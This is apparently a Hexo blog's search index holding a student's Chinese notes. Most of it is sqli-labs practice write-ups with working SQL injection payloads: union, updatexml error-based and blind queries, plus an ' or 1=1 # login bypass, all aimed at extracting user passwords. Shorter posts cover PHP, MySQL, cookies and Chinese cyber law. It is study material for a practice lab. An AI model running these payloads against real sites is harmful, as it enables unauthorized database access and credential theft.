<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/03/31/less4-20/"/>
      <url>/2022/03/31/less4-20/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><h2 id="less-4"><a href="#less-4" class="headerlink" title="less 4"></a>less 4</h2><p>第四关里通过报错可以发现 id&#x3D;1，id&#x3D;1‘，id&#x3D;1’） 都可以出现正确结果，然而当我们输入id&#x3D;1“时候出现了报错 </p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less4-1.png" alt="图片"></p><p>根据报错我们分析一下错误内容  </p><p>‘“1”“） limit 0，1’</p><p>减去‘’部分我们可以获得 “1“”）这个信息 那么就可以得知我们的sql语言是  select from where id&#x3D;（”id“）这样的信息，那么我们输入id&#x3D;1”)加上–+来忽略后面的”）并且插入我们的查询代码，继续用union查询来查询</p><p>先查库名 先让id值等于一个不可能的数字-1 执行后面的语句  id&#x3D;-1“）union select 1,2,database() –+</p><p>再查询表名字 ?id&#x3D;-1”) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ –+</p><p>再查询 所要找的表里面的列 ?id&#x3D;-1”) union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+</p><p>得到了有三个列 分别是 id admin password 查询账号密码  ?id&#x3D;-1”) union select 1,2, group_concat(password）from security.users –+  最终得到结果，不再进行演示，毕竟这个问题的难点全在一开始对于错误的解释 需要我们分析出来争取的sql查询语句 </p><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>第五题 刚开始就是这个样子 说明使用盲注入或者报错注入了，由于手工注入的不方便性，这次使用报错注入。</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-1.png"></p><p>这边就要提到 updatexml()这个函数了，其本意就是一个更新xml的函数，具体的格式是updatexml(目标xml内容，xml文档路径，更新的内容)</p><p>其中xml内容无关紧要，我们用1来代替 路径我们用一个子查询来报错引出我们所需要的东西，用concat来拼接（0x7e，子查询，0x7e），而更新的内容也不是什么重要的内容，报错注入主要是想让sql数据库来在一些重要的错误时爆出对哦我们有用的消息</p><p>先用之前学过的判断id的类型 再用updatexml来进行报错注入</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-3.png"></p><p>从而得到库名 security  </p><p>而查表的时候，内容与之前联合查询差不多，唯独加上了limit 的限制 因为他限制只有一行，所以我们从limit 0，1 一直实验到我们所需要的名上 </p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) –+ 查到users表</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-4.png"></p><p>继续查找列表</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-5.png"></p><p>找到密码，但需要一个个的看</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1) –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-6.png"></p><h2 id="less-6"><a href="#less-6" class="headerlink" title="less 6"></a>less 6</h2><p>第六关则是实验了 1，1’ ，1”后 发现只有在1“能过报错 说明id&#x3D; ”input“</p><p>其他的与第五关所差不大</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+</p><p>?id&#x3D;1“ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) –+ 查到users表</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ limit 0,1),0x7e),1) –+</p><p>?id&#x3D;1“ and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1) –+</p><blockquote><p>注意！注意！注意！千万要是<em><strong>英文字符</strong></em>，已经在这里吃亏了无数次了，老是错在一些奇奇怪怪的地方，等回过头来才发现，复制粘贴的时候容易变成中文符号，<em><strong>一定要注意！！！！！</strong></em></p></blockquote><h2 id="less-7"><a href="#less-7" class="headerlink" title="less 7"></a>less 7</h2><p>由于让我们使用outfile 但是依旧无法解决，决定使用比较慢的手工布尔盲注</p><p>首先先寻找注入点，这关的注入点很怪，先后实验了1‘ 1” 1’） 1“）1‘)),最后成功了</p><p>那么布尔盲注开始，首先我们做了很多题了，已经知道了库名和表名以及列名，</p><p>所以首先先了解几个知识补充</p><p>left()函数left（database(),1）&#x3D;’s‘ </p><p>left(a,b)寓意着从左侧a处截前b个，正确返回1，错误返回0，上述表达的便是数据库第一个是否为s</p><p>regexp()</p><p>like</p><p>同理</p><p>substr(a,b,c)</p><p>从b开始截取a字符串c个长度</p><p>ascii()</p><p>将字符串转化为ascii码 例如 select ascii（substr(select database()),1,1） 这个就是吧database里面的第一个字符提出并转化成为ascii码</p><p>chr()&#x2F;ord()</p><p>首先还是确定库名，</p><p>?id&#x3D;1’)) and substr((select database()),1,1)&#x3D;’s’ –+ 回显正常，那么确定库名还是老的那个security</p><p>其实也可以直接查?id&#x3D;1’)) and substr((select database()),1,8)&#x3D;’security’–+  省去一些时间，但是在世界问题中还是应该一步一步来，最好是利用ascii码来确定范围</p><p>ascii(substr(select datatbast()),1,1) &gt;数字日常世界问题中还是这么去做合适</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/7-2.png"></p><p>接着就是表名，我们需要users表</p><p>?id&#x3D;1’)) and substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),1,5)&#x3D;’users’ –+</p><p>回显正常，我们就有了表名</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/7-3.png"></p><p>再就是列名</p><p>?id&#x3D;1’)) and substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 2,1),1,8)&#x3D;’password’ –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/7-4.png"></p><p>剩下的就是对于密码的一个接一个尝试，就不多截图了</p><p>?id&#x3D;1’)) and substr((select group_concat(username,password) from security.users limit 0,1),1,1) –+</p><h2 id="less-8"><a href="#less-8" class="headerlink" title="less 8"></a>less 8</h2><p>第八题使用布尔盲注</p><p>先用length来判断库的长度</p><p>?id&#x3D;1’ and length(database())&#x3D;8 –+  成功则会返回跟?id&#x3D;1 一样的数值  </p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/8-1.png"></p><p>由于手工注入过于麻烦 ，我这次使用burp 的集束炸弹来进行攻击</p><p>先打开burp，打开网址后，输入?id&#x3D;1’ and substr((select database()),1,1)&#x3D;’s’ –+</p><p>回车前打开拦截 发送到inturder 在第一个1和最后一个s分别加上特殊字符，这一步是为了从1开始与ascii码的第一个开始寻找，第一个字符从第一个ascii开始筛找，然后第二个第三个，以此类推</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/8-2.png"></p><p>找到库名后再找表名*?id&#x3D;1’ and substr((select table_name from information_schema.tables where table_schema&#x3D;‘security’ limit 0,1),3,1)&#x3D;‘p’–+*</p><p>和字段名?id&#x3D;1’ and substr((select column_name from information_schema.columns where table_name&#x3D;‘users’ limit 0,1),1,1)&#x3D;‘u’–+*</p><p>最后的密码</p><p><em>?id&#x3D;1’ and substr((select password from security.users limit 0,1),1,1)&#x3D;‘d’–+</em></p><p>由于burp跑的太慢了只出来了一个，暂时先不加图片了</p><h2 id="less-9"><a href="#less-9" class="headerlink" title="less 9"></a>less 9</h2><p>时间盲注，由于跟第八题太过相像，burp上一个还没跑完，就同上一个就好了</p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less 10"></a>less 10</h2><p>先判断是否有注入点 尝试1 1’ 1”在1” 试验成功，然后继续时间盲注</p><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p>post的方式  不和以前一样 需要在网页上提交相对应的账号密码，但是我们仍可以通过万能钥匙来找到注入点 先输入（在username那里输入，不是网址）’ or 1&#x3D;1 #(只能用这个)不需要输入密码，直接回车</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/11-1.png">可以看到正常回显，说明存在注入点，开始正常注入</p><p>我们将用户栏当作我们的代码输入点  输入’union select 1,2 #</p><p>可以看到，我们的显示位置就出现了</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/11-2.png"></p><p>所以，我们就继续的联合注入  输入’ union select 1,database() #</p><p>出现库名在二的位置</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/11-3.png"></p><p>继续注入 ‘ union select 1,table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1 # (为了找到users表)</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/11-4.png"></p><p>继续 ‘ union select 1,column_name from information_schema.columns where table_name&#x3D;’users’ limit 2,1 #</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/11-5.png"></p><p>找到password ，查找密码 ‘ union select 1,password from users limit 2,1 #</p><p>可以继续查找，这里就不一一找到了</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/11-6.png"></p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less 12"></a>less 12</h2><p>也是post格式的，与11相似，但是闭合不同，这次的闭合通过‘ ” ’） “） ‘）） ”）） 多种尝试 </p><p>最后结果是”))  在前面换成这个，与11题一摸一样</p><h2 id="less-13"><a href="#less-13" class="headerlink" title="less 13"></a>less 13</h2><p>跟上面的略有不同 换成了报错注入，在尝试了多次后发现无法联合注入，尝试报错注入</p><p>在尝试输入’) or 1&#x3D;1 # 得到报错</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/13-1.png"></p><p>说明id是被‘’抱住的，所以我们的闭合就是‘）</p><p>然后开始报错注入，利用updatexml函数来进行注入</p><p>输入’) and updatexml(1,concat(0x7e,(select database()),0x7e),1) #</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/13-2.png"></p><p>继续找表名’) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’  limit 3,1),0x7e),1) #</p><p>找到users表</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/13-3.png"></p><p>找列名’) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’  limit 2,1),0x7e),1) #</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/13-4.png"></p><p>最后一步’) and updatexml(1,concat(0x7e,(select password from security.users  limit 2,1),0x7e),1) #</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less7-%EF%BC%9F/13-5.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/03/24/sqli_lib%E7%BB%83%E4%B9%A0/"/>
      <url>/2022/03/24/sqli_lib%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><h1 id="sqli-lib"><a href="#sqli-lib" class="headerlink" title="sqli-lib"></a>sqli-lib</h1><p>这几天新学习了sql手动注入，对sql注入做了些许了解</p><p>首先是命令的了解和基础概念</p><h2 id="1基础命令"><a href="#1基础命令" class="headerlink" title="1基础命令"></a>1基础命令</h2><p>sql的基础语言从登录开始</p><p>select *     #查询命令<br>from          #自己的数据库名称<br>where        #条件<br>username&#x3D;‘’ and password&#x3D;‘ ’</p><p>以上就是对于登录数据库所需要的基础代码<br>其中可以通过or 1&#x3D;1 – 这一条命令来判定为真，从而注释掉后面的代码来达到进入数据库的目的<br>例如  where  username &#x3D;’’ or 1&#x3D;1 –  ‘and password &#x3D;’ ‘<br>因为– 注释掉了后面的内容，并且or 两边同时为假才为假，1&#x3D;1恒真，所以可以直接进入</p><h2 id="2数据库的应知道的名字名称"><a href="#2数据库的应知道的名字名称" class="headerlink" title="2数据库的应知道的名字名称"></a>2数据库的应知道的名字名称</h2><p>数据库中默认含有一个库 叫做information_schema 数据库，用来储存信息 其中它的表名分别有</p><p>schemata（数据库名）</p><p>tables（表名）</p><p>columns（列名或者是字段名）</p><p>这四个我们将会在练习中多次运用到</p><p>其中 schemata中有一个schema_name来存储数据库名</p><p>tables中有table_schema 和  table_name分别存储数据库名和表名</p><p>在我们查询中 会有 database(),user(),version()分别用来查询数据库，用户，和版本</p><p>注意：user这个并不是表名</p><h2 id="3sql注入的类型"><a href="#3sql注入的类型" class="headerlink" title="3sql注入的类型"></a>3sql注入的类型</h2><p>sql注入有两种类型  数字型和字符型</p><p>数字型表现为 id&#x3D;1</p><p>字符型表现为id&#x3D;1’</p><p>可通过修改对应的id值：正常数字，字符，反斜杠 来判断是否存在注入点</p><p>通过网页对我们操作的报错可以进行解读</p><p>如</p><p><img src="https://raw.githubusercontent.com/TJ-deng/zhaopian.img/main/sqli/%E6%8A%A5%E9%94%991.png" alt="panduan"></p><p>我们输入？id&#x3D;1‘</p><p>报错为 ’‘1’‘ limit 0.1 ’</p><p>将两边的‘’去除，则我们能发现  ‘1’‘ limit  说明我们的id是被’‘包围的，说明我们的id是字符串类型的，</p><p>再有</p><p><img src="https://raw.githubusercontent.com/TJ-deng/zhaopian.img/main/sqli/%E6%8A%A5%E9%94%992.png" alt="panduan"></p><p>此时出现’‘1’‘）limit 0.1’ </p><p>我们继续分解 ‘1’‘） limit </p><p>我们输入的id是1’那么我们的id是字符串型的且，需要一个）来注释掉前面的（，从而继续执行操作</p><p>至于查询操作我们先从库名到表名到表里的内容一次进行</p><p>这次我们使用union来进行操作</p><p><img src="https://raw.githubusercontent.com/TJ-deng/zhaopian.img/main/ku.png" alt="ku"></p><p>先查询库名  这个比较简单  ?id&#x3D;-1 union select 1,2, database() –+</p><p>能够得知我们的库名是security </p><p>我们拿到了库名就可以进行下一步操作，去看看库里有哪些表</p><p>?id&#x3D;-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/zhaopian.img/main/table2.png" alt="table2"></p><p>从而得知库里的表有这几个，我们需要密码的和id那么我们进入user里面寻找</p><p>?id&#x3D;-1 union select 1,2, group_concat(column.name)from information_schema.columns  where table_name&#x3D;’users’ –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/zhaopian.img/main/table.png" alt="table"></p><p>如此，我们知道列表里有三种，最后直接查询密码即可</p><p>?id&#x3D;-1 union select 1,2, group_concat(password) from security.users –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/zhaopian.img/main/password.png" alt="password"></p><p>第三题看上文中对于报错的理解就可得知缺少） 所以在id&#x3D;1’) 基础上与第二题相差无几</p><p><img src="https://raw.githubusercontent.com/TJ-deng/zhaopian.img/main/sqli/%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C3.png" alt="jieguo3"></p><p>以上就是目前已经学习到的知识</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP会话控制的概述</title>
      <link href="/2022/03/17/HTTP%E4%BC%9A%E8%AF%9D%E6%8E%A7%E5%88%B6%E7%9A%84%E6%A6%82%E8%BF%B0/"/>
      <url>/2022/03/17/HTTP%E4%BC%9A%E8%AF%9D%E6%8E%A7%E5%88%B6%E7%9A%84%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p>HTTP协议本身是无状态的</p><p>http协议无法记录用户经常上哪些网站，有什么爱好，也无法记录用户的ID账号和密码，这就是无状态</p><p>HTTP协议本身是无状态的，客户端只需要简单的向服务器请求下载某些文件，无论是客户端还是服务器都没有必要记录彼此过去的行为，每一次请求之间都是独立的</p><p>HTTP协议自身不具备保存之前发送过的请求或相应的功能</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cookie注意事项</title>
      <link href="/2022/03/17/Cookie%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
      <url>/2022/03/17/Cookie%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<p>1.SetCookie()之前不能有任何html输出，空格，空白行都不行</p><p>2.SetCookie()之后，在当前页调用echo $_COOKIE[“name”]不会有输出，必须刷新或到下一个页面才可以看到Cookie值</p><p>3.使用Cookie的限制，一个浏览器能创建的Cookie数量最多为30个，并且每个不能超过4KB，每个WEB站点能设置的Cookie总数不能超过20个</p><p>4.Cookie是保存在客户端的，如果用户禁用了Cookie，那么Cookie也就失效了</p><p>5.Cookie的生命周期到了，Cookie就会失效</p><p>6.设置一个Cookie时失效时间为time()那么在页面浏览完之后就被删除</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL程序常用命令</title>
      <link href="/2022/03/17/MySQL%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/03/17/MySQL%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>显示所有数据库：show databases;</p><p>选定默认数据库：use dbname;</p><p>显示默认数据库中所有表：show tables;</p><p>放弃正在输入的命令：\c</p><p>显示命令清单：\h</p><p>退出MySQL程序：\q</p><p>查看MySQL服务器状态信息：\s</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL常用数据类型</title>
      <link href="/2022/03/17/MySQL%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2022/03/17/MySQL%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">分类</th><th align="center">备注和说明</th><th align="center">数据类型</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">二进制数据类型</td><td align="center">存储非字符和文本的数据</td><td align="center">BLOB</td><td align="center">可用来存储图像</td></tr><tr><td align="center">文本数据类型</td><td align="center">字符数据包括任意字母、符号或数字字符的组合</td><td align="center">char</td><td align="center">固定长度的Unicode字符数据</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">varchar</td><td align="center">可变长度非Unicode数据</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">text</td><td align="center">存储长文本信息</td></tr><tr><td align="center">日期和时间</td><td align="center">日期和时间在单引号内输入</td><td align="center">time</td><td align="center">时间</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">date</td><td align="center">日期</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">datetime</td><td align="center">日期和时间</td></tr><tr><td align="center">数据型数据</td><td align="center">该数据仅包含数字，包括正数，负数以及浮点数</td><td align="center">int、smallint</td><td align="center">整数</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">float、double</td><td align="center">浮点数</td></tr></tbody></table><p><strong>数值列类型</strong></p><p>所有数值列类型的类型名及其说明和所占的字节数见下表</p><table><thead><tr><th align="center">类型名</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">TINYINT</td><td align="center">非常小的整数</td></tr><tr><td align="center">SMALLINT</td><td align="center">较小的整数</td></tr><tr><td align="center">MEDIUMINT</td><td align="center">中等大小的整数</td></tr><tr><td align="center">INT</td><td align="center">标准整数</td></tr><tr><td align="center">BIGINT</td><td align="center">大整数</td></tr><tr><td align="center">FLOAT</td><td align="center">单精度浮点数</td></tr><tr><td align="center">DOUBLE</td><td align="center">双精度浮点数</td></tr><tr><td align="center">DECIMAL</td><td align="center">一个串的浮点数</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件访问函数:读取文件</title>
      <link href="/2022/03/17/PHP%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/"/>
      <url>/2022/03/17/PHP%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>读取文件常用函数</p><p>fread() ：读取整个文件或文件中指定长度的字符串，可用于二进制文件读取</p><p>fgets() ：读取文件中的一行字符</p><p>fgetss() ：读取文件中的一行字符并去掉所有HTML和PHP标记</p><p>fgetc() ：读取文件中的一个字符</p><p>file_get_contents() ：将文件读入字符串</p><p>file() ：把文件读入到一个数组中</p><p>readfile() ：读取一个文件，并输出到输出缓冲</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件操作函数：操作文件</title>
      <link href="/2022/03/17/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6/"/>
      <url>/2022/03/17/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">函数</th><th align="center">语法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">copy()</td><td align="center">copy(源文件，目的文件)</td><td align="center">复制文件</td></tr><tr><td align="center">unlink()</td><td align="center">unlink(目标文件)</td><td align="center">删除文件</td></tr><tr><td align="center">rename()</td><td align="center">rename(旧文件名，新文件名)</td><td align="center">重命名文件或目录，或移动文件</td></tr><tr><td align="center">ftruncate()</td><td align="center">ftruncate(目标文件资源，截取长度)</td><td align="center">将文件截断到指定长度</td></tr><tr><td align="center">file_exists()</td><td align="center">file_exists(目标文件名)</td><td align="center">判断文件或文件夹是否存在</td></tr><tr><td align="center">is_file()</td><td align="center">is_file(文件名)</td><td align="center">判断指定的路径存在且为文件</td></tr><tr><td align="center">realpath()</td><td align="center">realpath(文件名)</td><td align="center">返回文件的物理路径</td></tr><tr><td align="center">pathinfo()</td><td align="center">pathinfo(文件名)</td><td align="center">以数组形式返回文件的路径和文件名信息</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP目录的基本操作：操作目录</title>
      <link href="/2022/03/17/PHP%E7%9B%AE%E5%BD%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%9B%AE%E5%BD%95/"/>
      <url>/2022/03/17/PHP%E7%9B%AE%E5%BD%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">函数</th><th align="center">说明</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">mkdir(pathname)</td><td align="center">新建一个指定的目录</td><td align="center">mkdir(‘temp’)</td></tr><tr><td align="center">rmdir(dirname)</td><td align="center">删除目录，该目录必须为空</td><td align="center">rmdir(‘data’)</td></tr><tr><td align="center">getcwd(void)</td><td align="center">取得当前文件所在的目录</td><td align="center">echo getcwd();</td></tr><tr><td align="center">chdir(dirname)</td><td align="center">改变当前目录</td><td align="center">chdir(‘..&#x2F;‘);</td></tr><tr><td align="center">opendir(path)</td><td align="center">打开目录，返回目录的指针</td><td align="center">$dirh&#x3D;opendir(‘temp’);</td></tr><tr><td align="center">closedir()</td><td align="center">关闭目录，参数为目录指针</td><td align="center">closedir($dirh);</td></tr><tr><td align="center">readdir()</td><td align="center">遍历目录</td><td align="center">$file&#x3D;readdir($dirh);</td></tr><tr><td align="center">scandir(psth,sort)</td><td align="center">以数组形式遍历目录，sort参数可设置升序或降序排列</td><td align="center">$arr&#x3D;acandir(‘D:\ICQ’,1);</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP访问MySQL数据库的流程</title>
      <link href="/2022/03/17/PHP%E8%AE%BF%E9%97%AEMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
      <url>/2022/03/17/PHP%E8%AE%BF%E9%97%AEMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>第一步：连结MySQL服务器</p><p>​            使用 mysql_connect() 函数建立与MySQL服务器的连接</p><p>第二步：选择MySQL数据库</p><p>​            使用 mysql_select_db() 函数选择MySQL数据库服务器上的数据库，并与数据库建立连接</p><p>第三步：执行SQL语句</p><p>​            在选择的数据库中使用mysql_query() 函数执行SQL语句。</p><p>对数据的操作方式主要包括四种方式：</p><p>查询数据：使用select语句实现数据的查询功能</p><p>插入数据：使用insert into语句向数据库中插入数据</p><p>更新数据：使用update语句修改数据库中的记录</p><p>删除数据：使用delete语句删除数据库中的记录</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/03/12/%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE/"/>
      <url>/2022/03/12/%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="一-中国人民共和国刑法"><a href="#一-中国人民共和国刑法" class="headerlink" title="一 中国人民共和国刑法"></a>一 中国人民共和国刑法</h2><h6 id="熟悉中国的网络安全法"><a href="#熟悉中国的网络安全法" class="headerlink" title="熟悉中国的网络安全法"></a>熟悉中国的网络安全法</h6><p>获取该计算机信息存储，处理或者传输的数据，或者对该计算机信息系统实施非法控制。</p><p>提供专门用于侵入，非法控制计算机信息系统的程序，工具，或者明治他人实施侵入，非法控制计算机信息系统的违法犯罪行为而为其提供程序， <strong>三年以上七年以下</strong></p><p>在刑法地二百八十五，二百八十六条中，明确了单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。</p><p>后加一条，网络服务提供者不履行法律，行政法规规定的信息网络安全义务  造成</p><p>1 致使违法信息大量传播</p><p>2致使用户信息泄露，造成严重后果的</p><p>3致使刑事案件证据灭失，情节严重的</p><p>4有其他严重情节的</p><p>单位罚款，直接负责人依前三款规定处罚</p><h6 id="网络安全法"><a href="#网络安全法" class="headerlink" title="网络安全法"></a>网络安全法</h6><p>位于2016.11.7通过  于2017.6.1正式开始执行</p><h6 id="中华人民共和国密码法"><a href="#中华人民共和国密码法" class="headerlink" title="中华人民共和国密码法"></a>中华人民共和国密码法</h6><p>于中华人民共和国第十三届全国人民代表大会常务委员会第十四次会议 2019.10.26通过</p><p>于2020.1.1开始正式执行</p><h6 id="中华人民共和国数据安全法"><a href="#中华人民共和国数据安全法" class="headerlink" title="中华人民共和国数据安全法"></a>中华人民共和国数据安全法</h6><p>2021.6.10通过</p><p>2021.9.1正式执行</p><h6 id="个人信息保护法"><a href="#个人信息保护法" class="headerlink" title="个人信息保护法"></a>个人信息保护法</h6><p>2021.8.20通过</p><p>2021.11.1正式执行</p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><h6 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h6><p>进度调度，在单用户单任务的情况下，处理器仅为一个用户的一个任务所独占</p><h6 id="存储管理"><a href="#存储管理" class="headerlink" title="存储管理"></a>存储管理</h6><p>存储分配，存储共享，存储保护和存储扩张</p><h6 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h6><p>设备分配，设备传输控制，设备独立性</p><h6 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h6><p>文件存储空间的管理，目录管理，文件操作管理，文件保护</p><h6 id="作业管理"><a href="#作业管理" class="headerlink" title="作业管理"></a>作业管理</h6><p>负责处理用户提交的任何要求</p><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p>计算机操作系统：unix，windows</p><p>unix：Linux，mac，os</p><p>Windows：windows pc，Windows server</p><h1 id="二-虚拟机"><a href="#二-虚拟机" class="headerlink" title="二 虚拟机"></a>二 虚拟机</h1><h3 id="根目录包含内容"><a href="#根目录包含内容" class="headerlink" title="根目录包含内容"></a>根目录包含内容</h3><h4 id="x2F-bin"><a href="#x2F-bin" class="headerlink" title="&#x2F;bin"></a>&#x2F;bin</h4><p>存放常用命令 重要执行文档</p><h6 id="x2F-boot"><a href="#x2F-boot" class="headerlink" title="&#x2F;boot"></a>&#x2F;boot</h6><p>启动Linux的核心文件包括链接文件镜像文件</p><h4 id="x2F-dev"><a href="#x2F-dev" class="headerlink" title="&#x2F;dev"></a>&#x2F;dev</h4><p>存Linux的外部设备</p><h4 id="x2F-etc"><a href="#x2F-etc" class="headerlink" title="&#x2F;etc"></a>&#x2F;etc</h4><p>存放所有系统管理的配置文件和子目录 配置文件</p><h6 id="x2F-home"><a href="#x2F-home" class="headerlink" title="&#x2F;home"></a>&#x2F;home</h6><p>用户的主目录</p><h4 